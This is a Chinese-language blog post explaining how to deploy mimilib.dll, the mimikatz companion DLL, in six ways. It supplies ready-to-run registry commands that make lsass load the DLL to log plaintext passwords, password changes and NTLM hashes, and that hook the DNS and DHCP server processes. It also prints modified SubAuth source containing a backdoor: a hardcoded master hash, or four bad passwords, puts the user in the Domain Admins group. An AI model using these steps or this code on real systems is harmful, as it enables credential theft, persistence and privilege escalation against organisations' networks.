---
layout: post
title: Mimilib利用分析
---



## 0x00 前言
---

Mimilib是mimikatz的子工程，编译成功后生成文件mimilib.dll，包含多个导出函数。

目前介绍这个dll用法的资料比较少，于是我将结合自己的测试结果，逐个介绍mimilib.dll导出函数的用法。

## 0x01 简介
---

本文将要介绍以下内容：

- Mimilib导出函数简介
- 6种功能的具体用法

## 0x02 Mimilib导出函数简介
---

对应文件的地址为：

https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/mimilib.def

内容如下：

```
EXPORTS
	startW					=	kappfree_startW

	SpLsaModeInitialize		=	kssp_SpLsaModeInitialize
	
	InitializeChangeNotify	=	kfilt_InitializeChangeNotify
	PasswordChangeNotify	=	kfilt_PasswordChangeNotify

	WinDbgExtensionDllInit	=	kdbg_WinDbgExtensionDllInit
	ExtensionApiVersion		=	kdbg_ExtensionApiVersion
	coffee					=	kdbg_coffee
	mimikatz				=	kdbg_mimikatz

	DnsPluginInitialize		=	kdns_DnsPluginInitialize
	DnsPluginCleanup		=	kdns_DnsPluginCleanup
	DnsPluginQuery			=	kdns_DnsPluginQuery

	DhcpServerCalloutEntry	=	kdhcp_DhcpServerCalloutEntry
	DhcpNewPktHook			=	kdhcp_DhcpNewPktHook

	Msv1_0SubAuthenticationRoutine	= ksub_Msv1_0SubAuthenticationRoutine
	Msv1_0SubAuthenticationFilter	= ksub_Msv1_0SubAuthenticationRoutine
```

我将以上导出函数划分成了6个实用的功能

## 0x03 6种功能的具体用法
---

### 1.Security Support Provider

对应导出函数如下：

- SpLsaModeInitialize

使用方法：

将mimilib.dll保存至`%SystemRoot%\System32`

修改注册表位置：`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\`

注册表项`Security Packages`的值添加一个`mimilib`

重新启动系统

进程lsass.exe将会加载mimilib.dll，同时在`%SystemRoot%\System32`生成文件`kiwissp.log`，记录当前用户的明文口令，测试结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-1/2-1.png)

如果想在不重新启动系统的条件下实现相同的功能，可参考之前的分析文章：

- [Mimikatz中SSP的使用](https://3gstudent.github.io/3gstudent.github.io/Mimikatz%E4%B8%ADSSP%E7%9A%84%E4%BD%BF%E7%94%A8/)
- 域渗透——Security Support Provider

### 2.PasswordChangeNotify

对应导出函数如下：

- InitializeChangeNotify
- PasswordChangeNotify

使用方法：

将mimilib.dll保存至`%SystemRoot%\System32`

修改注册表位置：`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\`

注册表项`Notification Packages`的值添加一个`mimilib`

重新启动系统

进程lsass.exe将会加载mimilib.dll，当系统发生修改密码的事件时，在`%SystemRoot%\System32`生成文件`kiwifilter.log`，记录用户新修改的明文口令，测试结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-1/2-2.png)

如果想在不重新启动系统的条件下实现相同的功能，可参考之前的分析文章：

- 域渗透——Hook PasswordChangeNotify

### 3.WinDbg Extension

对应导出函数如下：

- WinDbgExtensionDllInit
- ExtensionApiVersion
- coffee
- mimikatz

使用方法：

将mimilib.dll保存至WinDbg的winext目录

我的测试环境(Server2012R2x64)保存的路径为：`C:\Program Files\Debugging Tools for Windows (x64)\winext`

启动WinDbg

加载插件的命令如下：

```
.load mimilib
```

测试结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-1/2-3.png)

调用命名实例：

```
!coffee
```

### 4.DnsPlugin

对应导出函数如下：

- DnsPluginInitialize
- DnsPluginCleanup
- DnsPluginQuery

使用方法：

需要在Dns服务器上进行测试

将mimilib.dll保存至`%SystemRoot%\System32`

修改注册表位置：`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\`

新建注册表项`ServerLevelPluginDll`，类型为`REG_SZ`，值为`mimilib.dll`

对应的cmd命令如下：

```
reg add HKLM\SYSTEM\CurrentControlSet\services\DNS\Parameters /v ServerLevelPluginDll /t REG_SZ /d "mimilib.dll" /f
```

重新启动系统

进程dns.exe将会加载mimilib.dll，当系统发生dns查询事件时，在`%SystemRoot%\System32`生成文件`kiwidns.log`，记录信息如下：

- QueryName
- QueryType

测试结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-1/2-4.png)

如果想远程实现相同的功能，可参考之前的分析文章：

- [域渗透——利用dnscmd在DNS服务器上实现远程加载Dll](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8dnscmd%E5%9C%A8DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDDll/)

### 5.DHCP callout DLL

对应导出函数如下：

- DhcpServerCalloutEntry
- DhcpNewPktHook

使用方法：

需要在DHCP服务器上进行测试

修改源代码，设置需要禁用的MAC地址，对应代码位置：https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdhcp.c#L35

将mimilib.dll保存至`%SystemRoot%\System32`

修改注册表位置：`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\DHCPServer\Parameters`

新建注册表项`CalloutDlls`，类型为`REG_MULTI_SZ`，值为`mimilib.dll`

新建注册表项`CalloutEnabled`，类型为`DWORD`，值为`1`

对应的cmd命令如下：

```
reg add HKLM\System\CurrentControlSet\Services\DHCPServer\Parameters /v CalloutDlls /t REG_MULTI_SZ /d "mimilib.dll" /f
reg add HKLM\System\CurrentControlSet\Services\DHCPServer\Parameters /v CalloutEnabled /t REG_DWORD /d 1 /f
```

重新启动系统

进程svchost.exe将会加载mimilib.dll，将对应MAC地址的DHCP请求丢弃

参考资料：

https://docs.microsoft.com/en-us/previous-versions/windows/desktop/dhcp/how-the-dhcp-server-api-operates

### 6.SubAuth

对应导出函数如下：

- Msv1_0SubAuthenticationRoutine
- Msv1_0SubAuthenticationFilter

使用方法：

将mimilib.dll保存至`%SystemRoot%\System32`

修改注册表位置：`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0`

新建注册表项`Auth0`，类型为`REG_SZ`，值为`mimilib`

对应的cmd命令如下：

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0 /v Auth0 /t REG_SZ /d "mimilib" /f
```

如果是域环境，需要在域控制器上进行设置

修改注册表位置：`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos`

新建注册表项`Auth0`，类型为`REG_SZ`，值为`mimilib`

对应的cmd命令如下：

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos /v Auth0 /t REG_SZ /d "mimilib" /f
```

重新启动系统

进程lsass.exe将会加载mimilib.dll，当系统产生登录事件时，在`%SystemRoot%\System32`生成文件`kiwisub.log`，记录信息如下：

- UserId
- PrimaryGroupId
- LogonDomainName
- UserName
- Workstation
- BadPasswordCount
- hash

这里需要注意当系统开机时，会记录计算机帐户的登录内容

这里可以尝试加入显示时间的代码，就能够获得每台主机的开机时间和用户登录时间

对应代码地址：https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/ksub.c

修改后的内容如下：

```
/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com

	Vincent LE TOUX
	http://pingcastle.com / http://mysmartlogon.com
	vincent.letoux@gmail.com

	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "ksub.h"


const BYTE myHash[LM_NTLM_HASH_LENGTH] = {0xea, 0x37, 0x0c, 0xb7, 0xb9, 0x44, 0x70, 0x2c, 0x09, 0x68, 0x30, 0xdf, 0xc3, 0x53, 0xe7, 0x02}; // Waza1234/admin
NTSTATUS NTAPI ksub_Msv1_0SubAuthenticationRoutine(IN NETLOGON_LOGON_INFO_CLASS LogonLevel, IN PVOID LogonInformation, IN ULONG Flags, IN PUSER_ALL_INFORMATION UserAll, OUT PULONG WhichFields, OUT PULONG UserFlags, OUT PBOOLEAN Authoritative, OUT PLARGE_INTEGER LogoffTime, OUT PLARGE_INTEGER KickoffTime)
{
	FILE *ksub_logfile;;
#pragma warning(push)
#pragma warning(disable:4996)
	if(ksub_logfile = _wfopen(L"kiwisub.log", L"a"))
#pragma warning(pop)
	{
		SYSTEMTIME st;
		GetLocalTime(&st);

		klog(ksub_logfile, L"%04d-%02d-%02d %02d:%02d:%02d %u (%u) - %wZ\\%wZ (%wZ) (%hu) ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, UserAll->UserId, UserAll->PrimaryGroupId, &((PNETLOGON_LOGON_IDENTITY_INFO) LogonInformation)->LogonDomainName, &((PNETLOGON_LOGON_IDENTITY_INFO) LogonInformation)->UserName, &((PNETLOGON_LOGON_IDENTITY_INFO) LogonInformation)->Workstation, UserAll->BadPasswordCount);
		if(UserAll->NtPasswordPresent)
			klog_hash(ksub_logfile, &UserAll->NtPassword, FALSE);
		if((UserAll->BadPasswordCount == 4) || (UserAll->NtPasswordPresent && RtlEqualMemory(UserAll->NtPassword.Buffer, myHash, min(sizeof(myHash), UserAll->NtPassword.Length))))
		{
			UserAll->PrimaryGroupId = 512;
			klog(ksub_logfile, L" :)\n");
		}
		else klog(ksub_logfile, L"\n");
		fclose(ksub_logfile);
	}
	*WhichFields = 0;
	*UserFlags = 0;
	*Authoritative = TRUE;
	LogoffTime->QuadPart = KickoffTime->QuadPart = 0x7fffffffffffffff;
	return STATUS_SUCCESS;
}
```

测试结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-1/2-5.png)

参考资料：

https://github.com/microsoft/Windows-classic-samples/tree/master/Samples/Win7Samples/security/authentication/msvsubauth

https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package

## 0x04 小结 
---

本文介绍了Mimilib中6种功能的具体用法。




---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)



